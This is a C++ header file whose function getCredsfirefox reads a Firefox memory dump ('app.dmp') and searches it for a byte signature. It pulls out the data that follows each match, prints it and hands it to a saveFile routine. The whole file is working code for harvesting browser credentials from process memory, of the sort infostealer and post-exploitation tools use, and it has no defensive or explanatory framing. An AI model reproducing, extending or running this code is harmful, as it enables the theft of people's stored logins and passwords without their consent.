#pragma once
#pragma once
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include "../core/saveFile.h"

int getCredsfirefox() {
    std::ifstream file("app.dmp", std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::vector<unsigned char> pattern = { 0x50, 0x02, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00 }; // Pattern with a wildcard (0xff)

    int foundCount = 0;
    int consecutiveSpaces = 0;

    while (!file.eof()) {
        unsigned char c;
        file.read(reinterpret_cast<char*>(&c), sizeof(c));

        if (c == pattern[0]) {
            bool match = true;

            for (size_t i = 1; i < pattern.size(); ++i) {
                file.read(reinterpret_cast<char*>(&c), sizeof(c));

                // Check if the current byte in the pattern is not a wildcard (0xff)
                if (pattern[i] != 0xff && c != pattern[i]) {
                    // If the byte doesn't match, set match to false and break out of the loop
                    match = false;
                    break;
                }
            }

            if (match) {
                std::vector<unsigned char> extractedData;

                while (!file.eof()) {
                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
                    if (c == 0x00) {
                        consecutiveSpaces++;
                        if (consecutiveSpaces == 2) {
                            break;
                        }
                    }
                    else {
                        consecutiveSpaces = 0;
                    }
                    extractedData.push_back(c);
                }

                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
                std::cout << "Pattern Data: " << utf8ExtractedData << std::endl;

                //Save into file
                saveFile(utf8ExtractedData);

                foundCount++;
            }
        }
    }

    file.close();

    std::cout << "Pattern Count: " << foundCount << std::endl;

    return 0;
}
